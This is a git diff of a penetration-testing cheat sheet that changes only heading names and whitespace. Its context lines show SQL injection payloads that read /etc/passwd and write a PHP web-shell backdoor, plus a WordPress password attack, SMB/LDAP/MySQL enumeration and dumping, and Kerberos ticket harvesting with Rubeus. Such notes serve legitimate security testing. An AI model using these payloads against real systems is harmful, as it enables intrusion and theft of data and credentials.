@@ -33,10 +33,10 @@
     - [Vulnerability scan](#vulnerability-scan)
     - [Wordpress (`wpscan`)](#wordpress-wpscan)
     - [Examples of common SQLi payloads](#examples-of-common-sqli-payloads)
-  - [Port 445 (SMB - Samba)](#port-445-smb-samba)
-  - [Port 389 (LDAP)](#port-389-ldap)
-  - [Port 3306 (MySQL)](#port-3306-mysql)
-  - [Port 5432 (PostgreSQL)](#port-5432-postgresql)
+  - [TCP Port 445 (SMB - Samba)](#tcp-port-445-smb-samba)
+  - [TCP Port 389 (LDAP)](#tcp-port-389-ldap)
+  - [TCP Port 3306 (MySQL)](#tcp-port-3306-mysql)
+  - [TCP Port 5432 (PostgreSQL)](#tcp-port-5432-postgresql)
 - [Windows](#windows)
   - [Shell](#shell)
   - [TCP Port 135 (RPC)](#tcp-port-135-rpc)
@@ -595,7 +595,7 @@ wpscan --url http://<IP>/ --password-attack wp-login -U admin -P /usr/share/word
 - (Linux) Reading file attempt ➡️ `?id=1 union all select 1, 2, load_file('/etc/passwd')`
 - (Windows) Writing file attempt  ➡️ `?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE '/var/ww/html/backdoor.php'`
 
-## Port 445 (SMB - Samba)
+## TCP Port 445 (SMB - Samba)
 
 - Listing directories: `smbclient -L //<IP>/<Sharename> -U "username%password"`
     - In case of a smb shell, we can download all files by doing:
@@ -615,12 +615,12 @@ wpscan --url http://<IP>/ --password-attack wp-login -U admin -P /usr/share/word
     
 - Enumerating shares: `crackmapexec smb $TARGET --shares`
 
-## Port 389 (LDAP)
+## TCP Port 389 (LDAP)
 
 - `ldapsearch -h <IP> -x -s base namingcontexts`
 - `ldapsearch -h <IP> -x -b "<distinguishedName>" | grep "^dn"`
 
-## Port 3306 (MySQL)
+## TCP Port 3306 (MySQL)
 
 - Remote connection:
     
@@ -634,13 +634,12 @@ wpscan --url http://<IP>/ --password-attack wp-login -U admin -P /usr/share/word
     mysqldump -h $TARGET -u $USER -p $DATABASE > $DATABASE.sql
     ```
     
-
 Useful links:
 
 - [MySQL Commands](http://g2pc1.bu.edu/~qzpeng/manual/MySQL%20Commands.htm)
 - [SQl.sh](https://sql.sh/)
 
-## Port 5432 (PostgreSQL)
+## TCP Port 5432 (PostgreSQL)
 
 Connect to database; user will be prompted for password: 
 
@@ -859,7 +858,6 @@ bloodhound-python -d $DOMAIN -u $USER -p $PASSWORD -c all -ns $TARGET
     ```powershell
     .\Rubeus.exe harvest /interval:30
     ```
-    
 
 ### Kerberoasting
 
